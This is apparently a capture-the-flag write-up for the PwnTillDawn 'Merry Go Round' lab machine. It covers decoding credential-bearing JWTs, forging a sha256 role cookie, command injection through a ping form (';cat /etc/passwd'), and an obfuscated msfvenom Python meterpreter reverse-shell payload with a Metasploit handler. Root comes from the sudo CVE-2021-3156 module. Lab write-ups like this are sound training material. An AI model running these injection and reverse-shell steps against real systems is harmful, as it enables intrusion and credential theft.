---
layout: post
title: PwnTillDawn - Merry Go Round Write-Up
date: 2025-03-03
classes: wide
description: Enumerating a Python web application, decoding JWT tokens and passwords, crafting custom cookies to elevate user privileges, getting a shell through a Code Execution vulnerability and escalating privileges with a known sudo CVE.
---

# Merry Go Round (10.150.150.100)

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/1.png)

## Initial Reconnaissance

Let's check the results from Nmap and gather some intel on available services.

![2](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/2.png)

Note that apart from SSH and a default Apache web server, we also have a Python application on port 5000 and some other ports with unknown services and strings. Since the results look the same, I'm assuming the strings are more relevant than the ports, so I've did some magic with `cut` to get the strings to a separate file:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibG9va2hlcmUiLCJwYXNzIjoiOGU1N2MyZGQzNmMxZDM4Y2YwODdiZWVkNWIzMjNlMDU5MDViZmU3ZiJ9.fBKrYMD45D_RzqpviCaEtbikRy1IEUMp_WpinskOFq8

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInBhc3MiOiJmb3Jlc2lnaHQifQ.__jHKPQmpDS8cv8pPeUzIw_Rf7023a9uS6lOJ06L310

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInBhc3MiOiJhbmltYWxzIn0.JkpC-k2Dn8ilSAEVPujOdC9k7_kXE3f8Nq83bYsoqcY

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaXRzbWUiLCJwYXNzIjoiNDdiY2U1Yzc0ZjU4OWY0ODY3ZGJkNTdlOWNhOWY4MDgifQ.Dl5z94QAi5MuOEA5sCO6-mY0zbuf7lJcvY-yMNr6v80

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaG9uZXkiLCJwYXNzIjoiMzdjNjA3MTE5OWZjMGQ1NGM3ODA0ZjRlZTY3ZTBiZTFmZjQ5MGUwOWE3MzE2ZWIyMDJmODE4ZDcwOTk1MjU3MGYzMGVmYjE1ZjMwMGQ1ZTYwNmMxZjAxMjdlMTNiMTkwODU0Y2UyMjFkNjllYjg3OTBhZjI4YTQ0NjNmYTZiODEifQ.B7oIwzKMDvqASNqGMeCF65oD8JARDh1rGrR26j6QQE4

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaXRzbWUiLCJwYXNzIjoiZDFlMDFlODU5MzYxNmY0NDViNWNkOWY5MDQzYTUyNDcifQ.lFjYg1jP-Uf2zLgTs9BBrbJJvtEQDhHF-IxjDBJTgg8

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaXRzbWUiLCJwYXNzIjoiMjE4MWU2NzQ0YWExYmE3ZjQxNzk5NmM2ODljMjA2YjkifQ.cgvHCCkeb3cuettvALYp3jqGqLKPJcjyw8cv7jsYNH0

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiIsInBhc3MiOiJVRTlxZG5JNFVrcDNlSGQxYWt0VFpRbz0ifQ.KnkALx296Nb4Y-2JzTvbK2IedamG7gp_TpKb36WFqhI

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicmljaGFyZCIsInBhc3MiOiI3MDc1NkU2NTY1NzQifQ.IhTAmFEqJYwvth8hLJDEolmkiOhDYEUqFmt3gB7qc5Y

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibG9va2hlcmUiLCJwYXNzIjoiOWU2Njk1ZDA5OTQ2NmUwZjE4MGM1ZTJjNmJmMjY1NDI4MTQzYTNlOSJ9.Hq55Zrk-QOUcQDEu-8kzIkpNxUnVspDKi8iScETwZsM
```



## Decrypt, Crack, Ride Again

As the default Apache web server doesn't contain any information, let's skip to the Python `Werkzeug` web server on port 5000. We're greeted with a login page with no additional functionalities since there's no reset password page linked. Also, the source-code doesn't have anything relevant on it.

![3](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/3.png)

If you're familiar with basic cryptography you've probably noticed the strings follow a certain pattern and they're likely to be base64 encoded strings. Attempt to decode any of the strings and you'll see they're actually JWT (Jason Web Tokens).

After using a [JWT debugger](https://jwt.io/) to decode the tokens, we'll notice that these tokens actually have usernames and passwords inside. Moreover, the stored passwords are encrypted with different algorithms for each one.

![4](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/4.png)

We don't have a valid signature, but that's not important, so I've taken each credential and added to another file:

```
lookhere:8e57c2dd36c1dc38cf087beed5b323e05905bfe7f
administrator:foresight
administrator:animals
itsme:47bce5c74f589f4867dbd57e9ca9f80d8
itsme:d1e01e8593616f445b5cd9f9043a5247
itsme:2181e6744aa1ba7f417996c68c20b9
john:UE9xgnI4UkcWkD1aktZRco=
richard:70756E657364
lookhere:9e6695d09946e0f18c5e2c6bf26542813a3e9
honey:37c6071199fc0d54c7804f4e67e2b1df490e09a7316eb202f818d70995257a3062f9ac6c17c1c7dbdc6ef72c31be77b64c1c859ea9f18fc0500d29b32c8ae8d5f5b7e5bc6e22806d0a
```

Different passwods use different algorithms and encodings, as mentioned previously, such as base64, MD5 and hexadecimal. So I've decoded every password except for the `honey` user:

```
lookhere:harvey
administrator:foresight
administrator:animals
itsme:aaa
itsme:joanne
itsme:mutant
john:POjvr8RJwxwujKSe
richard:puneet
lookhere:hal
honey:37c6071199fc0d54c7804f4ee67e0be1ff490e09a7316eb202f818d709952570f30efb15f300d5e606c1f0127e13b190854ce221d69eb8790af28a4463fa6b81
```

Now, after a few attempts, I've successfully logged in using `john`'s account, reaching the first flag.

![5](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/5.png)

Though the page asks for a username and employee ID, it doesn't matter what you type in, you'll be sent to an unauthorized page, so it has to be something else. The page tips us with the message `The higher you escalate, the more you see....` so checking users can't be right.



## Token Trickery

After being stuck for a while I've noticed something in the requests:

![6](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/6.png)

The cookie explicitly tell us is meant to set a role for the user, futhermore there's a JS library being used in this page with some base64 strings inside:

![7](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/7.png)

Decoding the base64 strings reveals crucial information abou the application:

```
role cookie format: sha256("username:user")
```

So this code is a `sha256` function, and the cookie format is username followed by a role, which can either be user or admin. Let's modify this cookie using the function inside thw brower console:

![8](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/8.png)

And after reloading the page, we'll be greeted again with a new message, and another flag.

![9](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/9.png)



## Command In, Shell Out

The new page has a simple ping functionality that's being executed inside the machine, so this calls for a Command Execution vulnerability instantly. Let's use a generic payload:

```
;cat /etc/passwd
```

![10](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/10.png)

The `;` symbol ensures the next command will be executed even though the last one returned an error, so we don't need to add an IP address. Time get a shell inside this machine. I'll be using `msfvenom` to generate the payload: 

```
msfvenom -p python/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f raw -o shell.py
```

> :bulb: **Did You Know?** You can actually use the network interface name instead of the IP address when creating payloads? (i.e. `lhost=interface`)

And here's our payload:

```
; python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<BASE64_ENCODED_PAYLOAD>')[0])))"
```

Now let's start the handler:

```
msfconsole -x "use multi/handler;set payload python/meterpreter/reverse_tcp;set lhost tun0;set lport 4444;run -j"
```

And after sending the payload we'll receive the connection:

![11](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/11.png)

The next flag will be found inside our current use home directory:

![12](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/12.png)



## Sudo, Sudo, Root

The method to escalate privileges on this machine is by identifying a known CVE due to the out-of-date sudo version:

```
sudo --version | head -n1
```

![13](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/13.png)

This version is actually vulnerable to CVE-2021-3156 (a.k.a. Sudo Baron Samedit). Since we're already using Metasploit, we can just use the available exploit for this CVE. Just use `Ctrl + Z` to background the current channel and `bg` to background the session, this will take you back to Metasploit.

```
search cve-2021-3156
```

![14](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/14.png)

This is the exact one! Let's fill the required information and fire it up:

```
use exploit/linux/local/sudo_baron_samedit
```

![15](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/15.png)

Once the exploit has been successfully executed, you can get another shell, this time as the `root`. The final flag is inside the user `happy` which we saw earlier in the `/etc/passwd` file:

![16](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_merry_go_round/16.png)

And with great success we have all the flags!
